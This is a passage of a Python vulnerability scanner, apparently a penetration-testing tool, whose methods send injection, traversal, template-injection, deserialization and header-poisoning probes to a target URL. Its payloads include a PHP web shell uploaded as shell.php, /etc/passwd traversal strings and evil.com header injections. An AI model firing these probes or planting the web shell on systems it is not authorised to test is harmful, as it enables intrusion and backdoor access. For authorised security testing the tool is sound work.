                    print(f"[!] IP-based bypass possible via {header}")
                    return True
        except Exception as e:
            pass
        
        print("[+] No IP spoofing bypass detected")
        return False
    
    def weak_crypto_check(self, url):
        """Check for weak cryptographic implementations"""
        print(f"\n[*] Checking for weak cryptography")
        
        try:
            resp = self.session.get(url, timeout=5)
            content = resp.text
            
            # Check for weak hashes and encoding with word boundaries to reduce false positives
            weak_patterns = [
                (r'\b[a-f0-9]{32}\b(?![a-f0-9])', 'MD5 hash'),
                (r'\b[a-f0-9]{40}\b(?![a-f0-9])', 'SHA1 hash'),
                (r'Basic [A-Za-z0-9+/]{20,}={0,2}\b', 'Basic Auth (Base64)'),
            ]
            
            findings = []
            for pattern, desc in weak_patterns:
                matches = re.findall(pattern, content)
                if matches:
                    # Filter out common false positives (UUIDs with dashes removed, CSS colors, etc.)
                    real_matches = [m for m in matches if not re.match(r'^[0-9a-f]{8}[0-9a-f]{4}[0-9a-f]{4}[0-9a-f]{4}[0-9a-f]{12}$', m.strip())]
                    if real_matches:
                        print(f"[!] Possible {desc} detected in response ({len(real_matches)} occurrence(s))")
                        findings.append(desc)
            
            if findings:
                self._record('weak_crypto_check', {'findings': findings})
                return True
        except Exception as e:
            pass
        
        print("[+] No obvious weak crypto detected")
        return False
    
    def session_fixation_test(self, url):
        """Test for session fixation"""
        print(f"\n[*] Testing for session fixation")
        
        try:
            # Get initial session
            resp1 = self.session.get(url, timeout=5)
            cookies1 = resp1.cookies
            
            if not cookies1:
                print("[-] No session cookies found")
                return False
            
            # Get the session cookie name and value
            session_cookie_name = None
            for cookie in cookies1:
                if any(name in cookie.name.lower() for name in ['session', 'sess', 'sid', 'phpsessid', 'jsessionid']):
                    session_cookie_name = cookie.name
                    break
            
            if not session_cookie_name:
                # Use first cookie as session candidate
                session_cookie_name = list(cookies1.keys())[0] if cookies1 else None
            
            if not session_cookie_name:
                print("[-] No identifiable session cookie")
                return False
            
            # Set an attacker-controlled session value
            attacker_session = 'attacker_fixated_session_12345'
            custom_cookies = {session_cookie_name: attacker_session}
            resp2 = self.session.get(url, cookies=custom_cookies, timeout=5)
            
            # Check if server echoes back our fixated session (key indicator)
            set_cookie_header = resp2.headers.get('Set-Cookie', '')
            resp2_cookies = resp2.cookies
            
            # Vulnerable if: server does NOT regenerate the session ID
            if resp2_cookies.get(session_cookie_name) == attacker_session:
                print(f"[!] Session fixation: server adopted attacker-controlled session ID")
                self._record('session_fixation_test', {'vulnerable': True, 'cookie': session_cookie_name})
                return True
            
            # Also check if attacker value appears in Set-Cookie
            if attacker_session in set_cookie_header:
                print(f"[!] Session fixation: attacker session reflected in Set-Cookie")
                self._record('session_fixation_test', {'vulnerable': True, 'cookie': session_cookie_name})
                return True
            
        except Exception as e:
            pass
        
        print("[+] No session fixation detected")
        return False
    
    def mixed_content_check(self, url):
        """Check for mixed content (HTTP resources on HTTPS)"""
        print(f"\n[*] Checking for mixed content")
        
        if not url.startswith('https://'):
            print("[-] Not an HTTPS site")
            return False
        
        try:
            resp = self.session.get(url, timeout=5)
            content = resp.text.lower()
            
            # Look for HTTP resources
            http_patterns = ['src="http://', 'href="http://', "src='http://", "href='http://"]
            
            for pattern in http_patterns:
                if pattern in content:
                    print(f"[!] Mixed content detected - HTTP resources on HTTPS page")
                    return True
        except Exception as e:
            pass
        
        print("[+] No mixed content detected")
        return False
    
    def file_upload_test(self, url):
        """Test file upload vulnerabilities"""
        print(f"\n[*] Testing file upload security")
        
        # Test various file types
        test_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('test.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.svg', '<svg onload=alert(1)>', 'image/svg+xml')
        ]
        
        for filename, content, mime_type in test_files:
            try:
                files = {'file': (filename, content, mime_type)}
                resp = self.session.post(url, files=files, timeout=5)
                
                if resp.status_code in [200, 201]:
                    print(f"[!] File upload accepted: {filename}")
                    return True
            except Exception as e:
                pass
        
        print("[+] File upload endpoint not found or secured")
        return False
    
    def api_auth_bypass_test(self, url):
        """Test API authentication bypass"""
        print(f"\n[*] Testing API authentication bypass")
        
        api_paths = ['/api/users', '/api/admin', '/api/config', '/api/v1/users']
        
        for path in api_paths:
            test_url = urljoin(url, path)
            try:
                # Test without authentication
                resp = self.session.get(test_url, timeout=5)
                
                if resp.status_code == 200 and len(resp.content) > 0:
                    # Verify it's actual data, not a generic page or login redirect
                    content_type = resp.headers.get('Content-Type', '')
                    if 'json' in content_type or 'xml' in content_type:
                        # JSON/XML response from API without auth is suspicious
                        try:
                            data = resp.json()
                            if isinstance(data, (list, dict)) and data:
                                print(f"[!] API endpoint returns data without auth: {test_url}")
                                self._record('api_auth_bypass_test', {'endpoint': test_url})
                                return True
                        except (ValueError, TypeError):
                            pass
            except Exception as e:
                pass
        
        print("[+] API authentication appears enforced")
        return False
    
    def timing_attack_test(self, url):
        """Test for timing attack vulnerabilities"""
        print(f"\n[*] Testing for timing attacks")
        
        num_samples = 5
        
        try:
            # Take multiple timing samples to reduce network noise
            long_pass_times = []
            short_pass_times = []
            
            for _ in range(num_samples):
                start = time.time()
                self.session.get(f"{url}?user=admin&pass={'A' * 50}", timeout=5)
                long_pass_times.append(time.time() - start)
                
                start = time.time()
                self.session.get(f"{url}?user=admin&pass=x", timeout=5)
                short_pass_times.append(time.time() - start)
            
            # Compare averages (excluding outliers)
            long_pass_times.sort()
            short_pass_times.sort()
            
            # Use median to reduce impact of network jitter
            avg_long = long_pass_times[num_samples // 2]
            avg_short = short_pass_times[num_samples // 2]
            
            diff = abs(avg_long - avg_short)
            if diff > 0.3:
                print(f"[!] Consistent timing difference: {diff:.3f}s (median over {num_samples} samples)")
                print(f"    Long password median: {avg_long:.3f}s, Short password median: {avg_short:.3f}s")
                self._record('timing_attack_test', {'diff_seconds': round(diff, 3), 'samples': num_samples})
                return True
        except Exception as e:
            pass
        
        print("[+] No significant timing differences detected")
        return False
    
    def prototype_pollution_test(self, url):
        """Test for prototype pollution"""
        print(f"\n[*] Testing for prototype pollution")
        
        # First get a baseline response
        try:
            baseline = self.session.get(url, timeout=5)
            baseline_text = baseline.text
        except Exception as e:
            print(f"[!] Error getting baseline: {e}")
            return None
        
        # Test via query parameters
        payloads = [
            '?__proto__[polluted]=true',
            '?constructor.prototype.polluted=true',
            '?__proto__.isAdmin=true',
        ]
        
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                # Check if pollution is reflected or causes behavioral change
                if 'polluted' in resp.text and 'polluted' not in baseline_text:
                    print(f"[!] Prototype pollution reflected with: {payload}")
                    self._record('prototype_pollution_test', {'vulnerable': True, 'payload': payload})
                    return True
                if 'isAdmin' in resp.text and 'isAdmin' not in baseline_text:
                    print(f"[!] Prototype pollution caused state change with: {payload}")
                    self._record('prototype_pollution_test', {'vulnerable': True, 'payload': payload})
                    return True
            except Exception as e:
                pass
        
        # Test via JSON body (more realistic for Node.js apps)
        json_payloads = [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
        ]
        
        for payload in json_payloads:
            try:
                resp = self.session.post(url, json=payload, timeout=5)
                if resp.status_code == 200:
                    # Check for evidence of pollution in subsequent request
                    check_resp = self.session.get(url, timeout=5)
                    if 'admin' in check_resp.text and 'admin' not in baseline_text:
                        print(f"[!] Prototype pollution via JSON body caused state change")
                        self._record('prototype_pollution_test', {'vulnerable': True, 'payload': str(payload)})
                        return True
            except Exception as e:
                pass
        
        print("[+] No prototype pollution detected")
        return False
    
    def mass_assignment_test(self, url):
        """Test for mass assignment vulnerability"""
        print(f"\n[*] Testing for mass assignment")
        
        # Try to inject admin/role parameters and check if they're reflected
        payloads = [
            {'isAdmin': 'true', 'role': 'admin'},
            {'admin': '1', 'privilege': 'admin'},
            {'user_role': 'administrator'}
        ]
        
        for payload in payloads:
            try:
                resp = self.session.post(url, json=payload, timeout=5)
                if resp.status_code in [200, 201]:
                    # Check if the injected privilege fields appear in the response
                    resp_text = resp.text.lower()
                    if any(key.lower() in resp_text and val.lower() in resp_text 
                           for key, val in payload.items()):
                        print(f"[!] Mass assignment: server reflects privilege fields: {list(payload.keys())}")
                        self._record('mass_assignment_test', {'vulnerable': True, 'fields': list(payload.keys())})
                        return True
            except Exception as e:
                pass
        
        print("[+] No mass assignment detected")
        return False

    def weak_cipher_check(self, hostname):
        """Check for weak SSL/TLS ciphers"""
        print(f"\n[*] Checking for weak ciphers on {hostname}")
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cipher = ssock.cipher()
                    if cipher:
                        cipher_name = cipher[0]
                        protocol = cipher[1]
                        bits = cipher[2]
                        print(f"[+] Cipher: {cipher_name} ({protocol}, {bits} bits)")
                        weak_ciphers = ['RC4', 'DES', '3DES', 'NULL', 'EXPORT', 'MD5']
                        if any(weak in cipher_name.upper() for weak in weak_ciphers):
                            print(f"[!] Weak cipher detected: {cipher_name}")
                            return True
                        if bits < 128:
                            print(f"[!] Weak cipher strength: {bits} bits")
                            return True
                        if protocol in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                            print(f"[!] Weak protocol version: {protocol}")
                            return True
                        print("[+] Cipher suite appears strong")
                        return False
        except Exception as e:
            print(f"[!] Error checking ciphers: {e}")
            return None

    def version_disclosure_check(self, url):
        """Check HTTP response headers for server version disclosure"""
        print(f"\n[*] Checking for version disclosure on {url}")
        try:
            resp = self.session.get(url, timeout=5)
            headers = resp.headers
            disclosure_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version',
                                  'X-AspNetMvc-Version', 'X-Generator']
            found = False
            for header in disclosure_headers:
                value = headers.get(header)
                if value:
                    print(f"[!] Version disclosure - {header}: {value}")
                    found = True
            if not found:
                print("[+] No version disclosure detected")
            return found
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

    def nosql_injection_test(self, url):
        """Test for NoSQL injection"""
        print(f"\n[*] Testing for NoSQL injection on {url}")
        payloads = [
            {"username": {"$gt": ""}, "password": {"$gt": ""}},
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"username": {"$exists": True}, "password": {"$exists": True}},
        ]

        for payload in payloads:
            try:
                resp = self.session.post(url, json=payload, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 0:
                    # Check for signs of successful bypass
                    if any(indicator in resp.text.lower() for indicator in ['welcome', 'dashboard', 'admin', 'success', 'token']):
                        print(f"[!] NoSQL injection detected with: {payload}")
                        return True
            except Exception as e:
                pass

        # Also test via query string
        qs_payloads = [
            "?username[$ne]=&password[$ne]=",
            "?username[$gt]=&password[$gt]=",
        ]
        for payload in qs_payloads:
            try:
                resp = self.session.get(f"{url}{payload}", timeout=5)
                if resp.status_code == 200 and any(ind in resp.text.lower() for ind in ['welcome', 'dashboard', 'admin']):
                    print(f"[!] NoSQL injection via query string: {payload}")
                    return True
            except Exception as e:
                pass

        print("[+] No NoSQL injection found")
        return False

    def ldap_injection_test(self, url):
        """Test for LDAP injection"""
        print(f"\n[*] Testing for LDAP injection on {url}")
        payloads = [
            '*',
            '*)(&',
            '*()|&\'',
            ')(cn=*)',
            '*(|(cn=*))',
            'admin)(&)',
            '*)(uid=*))(|(uid=*',
        ]

        for payload in payloads:
            test_url = f"{url}?user={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 100:
                    if any(err in resp.text.lower() for err in ['ldap', 'invalid dn', 'javax.naming', 'error in filter']):
                        print(f"[!] LDAP injection detected with: {payload}")
                        return True
            except Exception as e:
                pass

        # Also test via POST
        for payload in payloads:
            try:
                resp = self.session.post(url, data={'username': payload, 'password': payload}, timeout=5)
                if any(err in resp.text.lower() for err in ['ldap', 'invalid dn', 'javax.naming', 'error in filter']):
                    print(f"[!] LDAP injection detected via POST with: {payload}")
                    return True
            except Exception as e:
                pass

        print("[+] No LDAP injection found")
        return False

    def path_traversal_test(self, url):
        """Test for path traversal via URL path segments"""
        print(f"\n[*] Testing for path traversal on {url}")
        payloads = [
            '../../../etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '..\\..\\..\\windows\\win.ini',
            '....//....//....//etc/passwd',
            '..%252f..%252f..%252fetc%252fpasswd',
            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
        ]

        parsed = urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for payload in payloads:
            # Test in URL path segments
            test_url = f"{base}/{payload}"
            try:
                resp = self.session.get(test_url, timeout=5, allow_redirects=False)
                if 'root:' in resp.text or '[extensions]' in resp.text:
                    print(f"[!] Path traversal vulnerability with: {payload}")
                    return True
            except Exception as e:
                pass

            # Test in path parameter
            test_url = f"{url}/download/{payload}"
            try:
                resp = self.session.get(test_url, timeout=5, allow_redirects=False)
                if 'root:' in resp.text or '[extensions]' in resp.text:
                    print(f"[!] Path traversal in path segment: {payload}")
                    return True
            except Exception as e:
                pass

        print("[+] No path traversal found")
        return False

    def ssti_test(self, url):
        """Test for Server-Side Template Injection"""
        print(f"\n[*] Testing for SSTI on {url}")
        payloads = [
            ('{{7*7}}', '49'),
            ('${7*7}', '49'),
            ('<%= 7*7 %>', '49'),
            ('#{7*7}', '49'),
            ('{{7*\'7\'}}', '7777777'),
            ('${7*7}', '49'),
        ]

        for payload, expected in payloads:
            # Test via query parameter
            test_url = f"{url}?name={payload}"
            try:
                resp = self.session.get(test_url, timeout=5)
                if expected in resp.text and payload not in resp.text:
                    print(f"[!] SSTI detected with payload: {payload} (found '{expected}' in response)")
                    return True
            except Exception as e:
                pass

            # Test via POST
            try:
                resp = self.session.post(url, data={'name': payload, 'template': payload}, timeout=5)
                if expected in resp.text and payload not in resp.text:
                    print(f"[!] SSTI detected via POST with: {payload}")
                    return True
            except Exception as e:
                pass

        print("[+] No SSTI found")
        return False

    def email_injection_test(self, url):
        """Test for email header injection"""
        print(f"\n[*] Testing for email header injection on {url}")
        payloads = [
            'test@test.com\r\nBcc: attacker@evil.com',
            'test@test.com%0ABcc: attacker@evil.com',
            'test@test.com%0D%0ABcc: attacker@evil.com',
            'test@test.com\nCc: attacker@evil.com',
            'test@test.com%0ASubject: Injected',
        ]

        for payload in payloads:
            try:
                data = {
                    'email': payload,
                    'to': payload,
                    'from': payload,
                    'subject': 'Test',
                    'message': 'test'
                }
                resp = self.session.post(url, data=data, timeout=5)
                if resp.status_code == 200:
                    if any(indicator in resp.text.lower() for indicator in ['sent', 'success', 'delivered']):
                        print(f"[!] Email header injection possible with: {payload[:50]}...")
                        return True
            except Exception as e:
                pass

        print("[+] No email header injection found")
        return False

    def deserialization_test(self, url):
        """Test for insecure deserialization"""
        print(f"\n[*] Testing for insecure deserialization on {url}")

        # Java serialized object magic bytes (base64 encoded)
        java_payload = base64.b64encode(b'\xac\xed\x00\x05').decode()

        # PHP serialized payload
        php_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:4:"User":1:{s:4:"role";s:5:"admin";}',
        ]

        # Python pickle header (base64)
        python_payload = base64.b64encode(b'\x80\x04\x95').decode()

        # Test Java deserialization
        try:
            headers = {'Content-Type': 'application/x-java-serialized-object'}
            resp = self.session.post(url, data=base64.b64decode(java_payload), headers=headers, timeout=5)
            if resp.status_code in [200, 500]:
                if any(err in resp.text.lower() for err in ['java', 'deserializ', 'classnotfound', 'objectinputstream']):
                    print("[!] Java deserialization endpoint detected")
                    return True
        except Exception as e:
            pass

        # Test PHP deserialization
        for payload in php_payloads:
            try:
                resp = self.session.post(url, data={'data': payload}, timeout=5)
                if any(err in resp.text.lower() for err in ['unserialize', '__wakeup', '__destruct', 'php']):
                    print(f"[!] PHP deserialization vulnerability with: {payload}")
                    return True
            except Exception as e:
                pass

        # Test Python pickle
        try:
            headers = {'Content-Type': 'application/octet-stream'}
            resp = self.session.post(url, data=base64.b64decode(python_payload), headers=headers, timeout=5)
            if any(err in resp.text.lower() for err in ['pickle', 'unpickle', 'marshal']):
                print("[!] Python deserialization endpoint detected")
                return True
        except Exception as e:
            pass

        print("[+] No insecure deserialization found")
        return False

    def hpp_test(self, url):
        """Test for HTTP Parameter Pollution"""
        print(f"\n[*] Testing for HTTP Parameter Pollution on {url}")

        # Test duplicate parameters in GET - check if server processes both
        test_cases = [
            ('id', ['1', '2']),
            ('action', ['view', 'delete']),
        ]

        for param, values in test_cases:
            try:
                # Send single param first for comparison
                single_resp = self.session.get(f"{url}?{param}={values[0]}", timeout=5)
                
                # Send duplicate parameters
                dup_resp = self.session.get(f"{url}?{param}={values[0]}&{param}={values[1]}", timeout=5)
                
                # HPP indicator: duplicate params cause different behavior than single param
                if dup_resp.status_code != single_resp.status_code:
                    print(f"[!] HPP detected - duplicate '{param}' causes status code change")
                    return True
                # Check if the SECOND value is used (last-wins or combined behavior)
                if values[1] in dup_resp.text and values[1] not in single_resp.text:
                    print(f"[!] HPP detected - server processes duplicate param '{param}' (second value reflected)")
                    return True
            except Exception as e:
                pass

        # Test via POST with duplicate parameters
        try:
            single_data = "id=1&action=view"
            dup_data = "id=1&id=2&action=view&action=delete"
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            
            single_resp = self.session.post(url, data=single_data, headers=headers, timeout=5)
            dup_resp = self.session.post(url, data=dup_data, headers=headers, timeout=5)
            
            if dup_resp.status_code != single_resp.status_code:
                print("[!] HPP possible via POST duplicate parameters")
                return True
        except Exception as e:
            pass

        print("[+] No HTTP Parameter Pollution detected")
        return False

    def host_header_injection_test(self, url):
        """Test for Host header injection"""
        print(f"\n[*] Testing for Host header injection on {url}")

        parsed = urlparse(url)
        original_host = parsed.hostname

        # Headers that can override/supplement the Host header
        test_headers = [
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Host': 'evil.com'},
            {'X-Forwarded-Server': 'evil.com'},
            {'Host': f'{original_host}\r\nX-Injected: true'},
        ]

        try:
            normal_resp = self.session.get(url, timeout=5)
        except Exception as e:
            print(f"[!] Error: {e}")
            return None

        for headers in test_headers:
            try:
                resp = self.session.get(url, headers=headers, timeout=5)
                # Check if evil.com is reflected in response body (password reset poisoning, links, etc.)
                if 'evil.com' in resp.text and 'evil.com' not in normal_resp.text:
                    print(f"[!] Host header injection - 'evil.com' reflected with: {headers}")
                    self._record('host_header_injection_test', {'vulnerable': True, 'header': str(headers)})
                    return True
                # Check if injected header appears in response headers
                if 'X-Injected' in str(resp.headers):
                    print(f"[!] Host header CRLF injection detected")
                    return True
            except Exception as e:
                pass

        print("[+] No Host header injection found")
        return False

    def cache_poisoning_test(self, url):
        """Test for web cache poisoning"""
        print(f"\n[*] Testing for web cache poisoning on {url}")

        unkeyed_headers = [
            {'X-Forwarded-Host': 'evil.com'},
            {'X-Forwarded-Scheme': 'nothttps'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/admin'},
            {'X-Forwarded-Port': '443'},
            {'X-Host': 'evil.com'},
        ]

        for headers in unkeyed_headers:
            try:
                resp = self.session.get(url, headers=headers, timeout=5)
                header_name = list(headers.keys())[0]
                header_value = list(headers.values())[0]

                # Check if the unkeyed header value is reflected
                if header_value in resp.text:
                    print(f"[!] Cache poisoning possible - {header_name}: {header_value} reflected in response")
                    return True

                # Check for cache headers indicating response is cached
                cache_indicators = ['X-Cache', 'CF-Cache-Status', 'Age', 'X-Varnish']
                for indicator in cache_indicators:
                    if indicator in resp.headers:
                        if resp.headers[indicator] in ['HIT', 'hit']:
                            print(f"[!] Response is cached with unkeyed header {header_name}")
                            return True
            except Exception as e:
                pass

        print("[+] No web cache poisoning detected")
        return False

    def race_condition_test(self, url):
        """Test for race conditions using concurrent requests"""
        print(f"\n[*] Testing for race conditions on {url}")

        results = []
        num_threads = 10

        def make_request(url):
            try:
                resp = self.session.get(url, timeout=5)
                return resp.status_code, len(resp.content), resp.text[:100]
            except Exception as e:
                return None, None, str(e)

        try:
            # Send multiple concurrent requests
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = [executor.submit(make_request, url) for _ in range(num_threads)]
                for future in futures:
                    result = future.result(timeout=10)
                    results.append(result)
            elapsed = time.time() - start_time

            # Analyze results for inconsistencies
            status_codes = [r[0] for r in results if r[0] is not None]
            content_lengths = [r[1] for r in results if r[1] is not None]

            if len(set(status_codes)) > 1:
                print(f"[!] Inconsistent status codes in concurrent requests: {set(status_codes)}")
                print(f"    This may indicate a race condition")
                return True

            if len(set(content_lengths)) > 1:
                print(f"[!] Inconsistent response lengths in concurrent requests")
                print(f"    Lengths: {set(content_lengths)}")
                return True

            if 429 in status_codes:
                print("[+] Rate limiting active - race condition mitigated")
            else:
                print(f"[+] All {num_threads} concurrent requests returned consistent results ({elapsed:.2f}s)")

        except Exception as e:
            print(f"[!] Error during race condition test: {e}")

        print("[+] No race condition detected")
        return False

def main():
    parser = argparse.ArgumentParser(description='VAPT Scanner - Educational Use Only')
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-u', '--url', help='Target URL for web tests')
    parser.add_argument('-p', '--ports', action='store_true', help='Run port scan')
    parser.add_argument('-w', '--web', action='store_true', help='Run web vulnerability tests')
    parser.add_argument('-s', '--ssl', action='store_true', help='Check SSL certificate')
    parser.add_argument('-d', '--subdomain', action='store_true', help='Enumerate subdomains')
    parser.add_argument('-a', '--all', action='store_true', help='Run all tests')
    parser.add_argument('-o', '--output', help='Output JSON report to file')
    
    args = parser.parse_args()
    
    print("="*60)
    print("VAPT Scanner - Vulnerability Assessment Tool")
    print("Educational/Authorized Use Only")
    print("="*60)
    
    scanner = VAPTScanner(args.target)
    
    if args.all or args.ports:
        scanner.port_scan()
    
    if args.all or args.ssl:
        scanner.ssl_check(args.target)
        scanner.weak_cipher_check(args.target)
        scanner.heartbleed_test(args.target)
    
    if args.all or args.subdomain:
        scanner.subdomain_enum(args.target)
        scanner.subdomain_takeover_check(args.target)
        scanner.dns_zone_transfer(args.target)
    
    if args.url and (args.all or args.web):
        scanner.http_header_check(args.url)
        scanner.version_disclosure_check(args.url)
        scanner.cms_detection(args.url)
        scanner.robots_check(args.url)
        scanner.security_txt_check(args.url)
        scanner.sql_injection_test(args.url)
        scanner.nosql_injection_test(args.url)
        scanner.ldap_injection_test(args.url)
        scanner.xss_test(args.url)
        scanner.lfi_test(args.url)
        scanner.rfi_test(args.url)
        scanner.path_traversal_test(args.url)
        scanner.xxe_test(args.url)
        scanner.xml_bomb_test(args.url)
        scanner.ssrf_test(args.url)
        scanner.ssti_test(args.url)
        scanner.command_injection_test(args.url)
        scanner.email_injection_test(args.url)
        scanner.crlf_injection_test(args.url)
        scanner.shellshock_test(args.url)
        scanner.cors_check(args.url)
        scanner.clickjacking_test(args.url)
        scanner.open_redirect_test(args.url)
        scanner.jwt_test(args.url)
        scanner.http_methods_test(args.url)
        scanner.cookie_security_check(args.url)
        scanner.deserialization_test(args.url)
        scanner.hpp_test(args.url)
        scanner.host_header_injection_test(args.url)
        scanner.cache_poisoning_test(args.url)
        scanner.http_request_smuggling(args.url)
        scanner.http_response_splitting(args.url)
        scanner.content_type_confusion(args.url)
        scanner.graphql_introspection(args.url)
        scanner.websocket_test(args.url)
        scanner.oauth_misconfiguration_test(args.url)
        scanner.rate_limiting_check(args.url)
        scanner.idor_test(args.url)
        scanner.ssi_injection_test(args.url)
        scanner.xpath_injection_test(args.url)
        scanner.ip_spoofing_test(args.url)
        scanner.weak_crypto_check(args.url)
        scanner.session_fixation_test(args.url)
        scanner.mixed_content_check(args.url)
        scanner.file_upload_test(args.url)
        scanner.api_auth_bypass_test(args.url)
        scanner.timing_attack_test(args.url)
        scanner.prototype_pollution_test(args.url)
        scanner.mass_assignment_test(args.url)
        scanner.info_disclosure(args.url)
        scanner.api_endpoint_scan(args.url)
        scanner.backup_file_scan(args.url)
        scanner.directory_scan(args.url)
        scanner.race_condition_test(args.url)
    
    print("\n[*] Scan complete")

    # Write JSON report if --output specified
    if args.output:
        report = {
            'scan_metadata': {
                'target': args.target,
                'url': args.url,
                'timestamp': datetime.now().isoformat(),
                'scan_type': 'full' if args.all else 'selective'
            },
            'results': scanner.results
        }
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        print(f"[*] JSON report saved to: {args.output}")

if __name__ == "__main__":
    main()
